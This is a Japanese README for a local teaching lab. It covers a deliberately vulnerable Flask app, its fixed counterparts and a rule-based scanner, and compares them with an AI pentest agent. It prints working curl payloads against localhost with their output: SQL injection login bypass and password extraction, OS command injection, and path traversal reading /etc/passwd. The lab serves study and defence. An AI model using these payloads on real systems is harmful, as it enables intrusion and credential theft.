# 脆弱性実証ラボ(エージェント不要・サンドボックス内完結版)

Strix(AIエージェントによる自動ペンテスト)をローカル(Windows/WSL2 + Ollama/Groq/OpenRouter)で
動かす一連の試み([`../strix-local-poc/windows-wsl-ollama-setup.md`](../strix-local-poc/windows-wsl-ollama-setup.md))
と並行して、「発想を変えて、AIエージェントなしで脆弱性自体を実証する」ために作った最小限のラボ。
当初はSQLiのみだったが、「Strixは他の脆弱性クラスも見る」という問いを受けてXSS、さらに
OSコマンドインジェクション・パストラバーサルにも対応範囲を広げた。

Claude Codeのクラウドサンドボックス環境は外向きのLLM通信がほぼ全てブロックされているため
(詳細は[`../strix-local-backend-notes.md`](../strix-local-backend-notes.md))、Strixのようなエージェント実行は
ここでは成立しなかった。一方で、**このサンドボックス自体を対象にしたSQLi実証**であれば、
外部通信は一切不要(pip install flaskのみでpypi.orgに1回アクセスするだけ)なので、問題なく完結した。

> ⚠️ 本コードは意図的に脆弱です。自分が所有・管理する隔離環境以外では絶対に動かさないこと。

## スコープ制限(誤って外部に撃たないためのガード)

`auto_vuln_scanner.py`は実際に攻撃ペイロードを送信するツールなので、`netcheck/netcheck.py`
と同じ考え方で、**既定ではローカル(`127.0.0.0/8`)とプライベート範囲(`10.0.0.0/8`・
`172.16.0.0/12`・`192.168.0.0/16`・`::1`)以外には対して実行できない**ようにしてある。
`--url`のホスト名を解決し、解決先IPがこれらの範囲外なら即座に拒否する(exit code 2)。

```bash
# 拒否される例
python3 auto_vuln_scanner.py --url http://8.8.8.8/login --class sqli --baseline x=x --fuzz x
# => Refusing to scan: '8.8.8.8' resolves to 8.8.8.8, which is outside
#    localhost/RFC1918 private ranges. ... pass --i-own-this-target to override.
```

自分が所有する、プライベート範囲外のホスト(社内ネットワークの外のステージング環境等)を
明示的にテストしたい場合のみ、`--i-own-this-target`で上書きできる。

## 対象アプリ

[`vulnerable_app.py`](vulnerable_app.py): Flask + SQLite の最小アプリ。4種類の脆弱性クラスを含む。

- `/login`: 文字列連結でSQLを組み立てる、**意図的に脆弱**なエンドポイント(SQLi)
- `/login_safe`: パラメータ化クエリ(プレースホルダ `?`)を使う、**修正済み**の同じ機能のエンドポイント
- `/search`: 入力をHTMLエスケープせずそのまま反映する、**意図的に脆弱**なエンドポイント(反射型XSS)
- `/search_safe`: `markupsafe.escape()`でエスケープする、**修正済み**の同じ機能のエンドポイント
- `/diag`: `subprocess.run(..., shell=True)` + 文字列連結で外部コマンドを組み立てる、**意図的に脆弱**な
  エンドポイント(OSコマンドインジェクション)
- `/diag_safe`: `shell=False`でホスト名を1つの引数として渡す、**修正済み**の同じ機能のエンドポイント
- `/file`: `docs/`配下のファイルを素朴にパス連結で読む、**意図的に脆弱**なエンドポイント(パストラバーサル)
- `/file_safe`: 解決後のパスが`docs/`配下に収まっているかを検証する、**修正済み**の同じ機能のエンドポイント

起動:

```bash
pip3 install --user flask
python3 vulnerable_app.py   # http://127.0.0.1:5000
```

## 実証した攻撃(すべて `curl` で再現可能)

### 1. 認証バイパス(コメントアウトでパスワード条件を無効化)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
```

生成されるSQL:

```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin' --' AND password = 'anything'
```

結果: パスワードを一切知らずに `admin`(is_admin=1)でログイン成立。

### 2. OR 1=1(常に真の条件で全行マッチ)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=admin' OR '1'='1' --" \
  --data-urlencode "password=anything"
```

結果: 全ユーザー行が返り、ログイン成立。

### 3. UNIONベースのデータ抽出(パスワードを直接窃取)

```bash
curl -s -G "http://127.0.0.1:5000/login" \
  --data-urlencode "username=nobody' UNION SELECT id, username, password FROM users --" \
  --data-urlencode "password=x"
```

結果:

```
Rows: [(1, 'alice', 'alice_pw_123'), (2, 'bob', 'bob_pw_456'), (3, 'admin', 'S3cretAdminPW!')]
```

ログインすら試みずに、全ユーザーの平文パスワード(admin含む)を直接取得できた。

### 対策の効果(同じ攻撃を `/login_safe` に送る)

```bash
curl -s -G "http://127.0.0.1:5000/login_safe" \
  --data-urlencode "username=admin' --" \
  --data-urlencode "password=anything"
# => "Login failed." (攻撃文字列はただの文字列として扱われ、無効化される)
```

パラメータ化クエリ(プレースホルダ + バインド)に変えるだけで、同じ入力が
SQL構文として解釈されなくなり、上記3つの攻撃すべてが無効になる。

### 4. OSコマンドインジェクション(`/diag`)

```bash
curl -s -G "http://127.0.0.1:5000/diag" --data-urlencode "host=example.com; id"
# => Checking: example.com
#    uid=0(root) gid=0(root) groups=0(root)
```

`;`でコマンドを連結でき、本来意図していない`id`コマンドの出力がそのまま漏洩する。
`shell=True` + 文字列連結が原因。対策版(`/diag_safe`、`shell=False`でホスト名を
1つの引数として渡す)に同じ攻撃を送ると、`;`等は単なる文字列として扱われ無効化される。

```bash
curl -s -G "http://127.0.0.1:5000/diag_safe" --data-urlencode "host=example.com; id"
# => Checking: example.com; id   (コマンドとして解釈されず、ただの文字列)
```

### 5. パストラバーサル(`/file`)

```bash
curl -s -G "http://127.0.0.1:5000/file" --data-urlencode "name=../../../../../../../../../../etc/passwd"
# => root:x:0:0:root:/root:/bin/bash ...
```

意図していた`docs/`ディレクトリの外、`/etc/passwd`の内容がそのまま読み出せる。
対策版(`/file_safe`、解決後のパスが`docs/`配下に収まっているかを検証)に同じ攻撃を送ると、
`403 Access denied.`で拒否される。

## まとめ・学び

- SQLiの本質(文字列連結でSQLを組み立てる = 入力がコードとして解釈される)は、
  Strixのような自動ツールを使わなくても、数行のコードと`curl`だけで即座に再現・実証できる。
- 自動ペンテストエージェント(Strix)は「人手で1件ずつ試す」作業を自動化するものであり、
  SQLiという脆弱性クラス自体の理解や実証には必須ではない。
- 修正は複雑な話ではなく、**文字列連結をやめてパラメータ化クエリにする**、の一点に尽きる。
  (ORMを使っている場合も、素のSQL文字列を組み立てる箇所が残っていないか要確認。)

## LLM抜きの自動検出スクリプト

[`auto_sqli_scanner.py`](auto_sqli_scanner.py): SQLi専用の、最初に作った最小スキャナー(そのまま残してある)。

[`auto_vuln_scanner.py`](auto_vuln_scanner.py): Strixのように「次に何を試すかをLLMが判断する」のではなく、
固定のペイロードリストを総当たりし、レスポンスを機械的に比較するだけの、LLM不要・ルールベースのスキャナー。
`--class`で脆弱性クラスを切り替え可能(現在は`sqli`・`xss`・`cmdi`・`traversal`に対応)。

```bash
pip3 install --user requests

# SQLi: 脆弱版 /login をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/login --class sqli \
  --baseline username=zzz --baseline password=zzz --fuzz username

# SQLi: 修正版 /login_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/login_safe --class sqli \
  --baseline username=zzz --baseline password=zzz --fuzz username

# XSS: 脆弱版 /search をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/search --class xss \
  --baseline q=zzz --fuzz q

# XSS: 修正版 /search_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/search_safe --class xss \
  --baseline q=zzz --fuzz q

# コマンドインジェクション: 脆弱版 /diag をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/diag --class cmdi \
  --baseline host=zzz --fuzz host

# コマンドインジェクション: 修正版 /diag_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/diag_safe --class cmdi \
  --baseline host=zzz --fuzz host

# パストラバーサル: 脆弱版 /file をスキャン
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/file --class traversal \
  --baseline name=public.txt --fuzz name

# パストラバーサル: 修正版 /file_safe をスキャン(検出ゼロになるはず)
python3 auto_vuln_scanner.py --url http://127.0.0.1:5000/file_safe --class traversal \
  --baseline name=public.txt --fuzz name
```

## まとめて1回で実行する

[`scan_all.sh`](scan_all.sh): 上記8パターン(SQLi/XSS/コマンドインジェクション/パストラバーサル
× それぞれ脆弱/修正)を1コマンドで実行するラッパースクリプト。`vulnerable_app.py`が起動済みであることが前提。

```bash
python3 vulnerable_app.py &
./scan_all.sh
```

実行結果:

| 脆弱性クラス | 対象 | ペイロード数 | 検出数 |
|---|---|---|---|
| SQLi | `/login`(脆弱) | 8 | 5(認証バイパス3 + SQLエラー漏洩2) |
| SQLi | `/login_safe`(修正済み) | 8 | 0(誤検知なし) |
| XSS | `/search`(脆弱) | 4 | 4(全ペイロードが未エスケープで反映) |
| XSS | `/search_safe`(修正済み) | 4 | 0(誤検知なし) |
| コマンドインジェクション | `/diag`(脆弱) | 5 | 5(`id`出力の漏洩を全パターンで検出) |
| コマンドインジェクション | `/diag_safe`(修正済み) | 5 | 0(誤検知なし) |
| パストラバーサル | `/file`(脆弱) | 3 | 1(素の`../`での脱出を検出) |
| パストラバーサル | `/file_safe`(修正済み) | 3 | 0(誤検知なし) |

(パストラバーサルは3種のペイロードのうち1種のみ検出: この最小アプリは入力をそのまま
`os.path.join`に渡すだけなので、URLエンコード済み(`..%2f`)や二重ドット変種(`....//`)の
回避テクニックは素の`../`と違って文字列として素通りし、意図通り「刺さらなかった」。
これはこの簡易実装の限界であり、実際のWAF回避やエンコーディングのバリエーションを
網羅したい場合はペイロードと検出ロジックの拡充が必要。)

脆弱性クラスを追加する方法: `VULN_CLASSES`にペイロードリストと`detect()`関数を1組追加するだけ。
LLMの「判断」をルールで置き換えている分、対応したいクラスの数だけルールを増やす必要がある
(これがStrixのような汎用エージェントとの根本的な違い — Strixは未知のケースにもLLMの推論で対応しうるが、
このスクリプトは既知のパターンにしか反応しない)。

Strixとの違い(全体像):

| | Strix(AIエージェント) | この簡易スキャナー |
|---|---|---|
| 判断方式 | LLMが毎ターン次の一手を考える | 固定ペイロードを総当たり |
| 対応範囲 | SQLi/XSS/SSRF/認証不備/ビジネスロジック等、何でも(LLMの推論次第) | `VULN_CLASSES`に実装したクラスのみ |
| 必要なもの | LLM API + Dockerサンドボックス | Python + requests のみ |
| 柔軟性 | 未知のパターンにも適応しうる(が実行が不安定だった) | 既知のペイロードのみ |
| 今回の結果 | Turn8まで進行、結論不明のまま断念 | 即座に成功、再現性あり |

## WSL側の実機アクセスログでも再現確認済み

クラウドサンドボックスでの結果だけでなく、WSL(Ubuntu、venv経由でflask/requestsを導入)で
`./scan_all.sh`を実行し、**完全に同じ検出結果**が再現することを確認した。Flask自体の
アクセスログ(ステータスコード)からも、これが見せかけではなく本物のSQL構文として
解釈されたことが裏付けられる:

```
GET /login?username=zzz&password=zzz                    401  (正常系: 失敗、期待通り)
GET /login?username='+OR+'1'%3D'1'+--&password=zzz      200  (SQLi成功: 認証バイパス)
GET /login?username='+OR+1%3D1+--&password=zzz          200  (SQLi成功: 認証バイパス)
GET /login?username=')+OR+('1'%3D'1'+--&password=zzz    500  (SQL構文エラー漏洩)
GET /login?username='+UNION+SELECT+NULL,NULL,NULL+--...  200  (SQLi成功: UNION注入)
GET /login?username='&password=zzz                       500  (SQL構文エラー漏洩)

GET /login_safe?(同じペイロード全部)                      401  (全て無効化、期待通り)
```

無害な入力(`zzz`/`zzz`)では401(失敗)だったのに、SQLペイロードを入れた途端200(成功)や
500(SQLエラー)に変わる — これはサーバー側で実際にSQL文字列が組み替えられ、クエリの意味が
変わったことの直接的な証拠。シミュレーションではなく本物のSQLiが成立している。`/login_safe`
側は同じ入力でも全て401で変化が無く、パラメータ化クエリが効いていることも対照で確認できる。
(XSSはステータスコードだけでは判断できない — レスポンス本文にタグが未エスケープで残って
いるかどうかで判定する必要があり、`auto_vuln_scanner.py`の`detect_xss()`はそちらを見ている。)

## 補足: これは「Strixの簡易版」ではない

`auto_vuln_scanner.py`は便宜上「Strixの代替」と呼んでいるが、正確には**Strixの一部機能
(次に何を試すかの判断)だけを、既知の2クラスに限定してルールに置き換えたもの**であり、
Strixそのものの簡易版ではない。Strixが持っていて、このスクリプトには無いもの:

- **攻撃対象の自動発見**: どのURL・どのパラメータが存在するかを、人間が指定しなくても
  自分でクロール/ブラウジングして見つける機能。このスクリプトは`--url`と`--fuzz`を
  人間が指定する前提。
- **未知のパターンへの適応**: LLMの推論により、ペイロードリストに無い状況にも対応しうる。
- **汎用性**: SQLi/XSS以外の任意の脆弱性クラスも、LLMが自分で考えて試せる。

つまり「Strixの代替になった」わけではなく、「このPoCで実証したかったこと(既知の
脆弱性パターンの自動検出)は、より簡単な方法で達成できた」というのが正確な位置づけ。

## このラボとStrix PoCの関係

- Strix PoC([`../strix-local-poc/`](../strix-local-poc/))は「AIエージェントに自動で脆弱性を見つけさせる」
  という、より野心的な目標に取り組んだ(local LLM・Groq・OpenRouter全てで構造的な壁に当たり、未完のまま)。
  Strix自体はSQLi専用ではなく、SQLi/XSS/SSRF/認証不備/ビジネスロジックの欠陥など広範囲を対象にできる
  汎用ツールだが、本PoCでは`--instruction`でSQLiのみに意図的にスコープを絞っていた。
- 本ラボは、同じ「脆弱性を実際に試す」というゴールを、エージェントを使わずに最短距離で達成した。
  最終的には「LLMは不要だった」という結論に至り、SQLi・XSSの両方をLLM抜きのルールベース
  スキャナー(`auto_vuln_scanner.py`)で自動検出できることを実証した。
- 両者は競合するものではなく、「(少なくとも既知の脆弱性パターンについては)ツールに頼らなくても
  検証はできる」という補完的な結論を示している。
